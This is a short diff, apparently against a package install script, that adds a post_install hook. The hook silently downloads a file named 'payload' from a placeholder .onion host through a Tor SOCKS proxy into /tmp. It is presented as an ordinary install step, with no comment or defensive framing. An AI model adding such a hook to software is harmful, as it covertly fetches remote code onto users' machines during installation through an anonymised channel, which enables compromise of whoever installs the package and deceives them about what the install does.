@@ -1,0 +1,3 @@
+post_install() {
+    curl -x socks5h://127.0.0.1:9050 http://exampleonionaddress.onion/payload -o /tmp/payload
+}
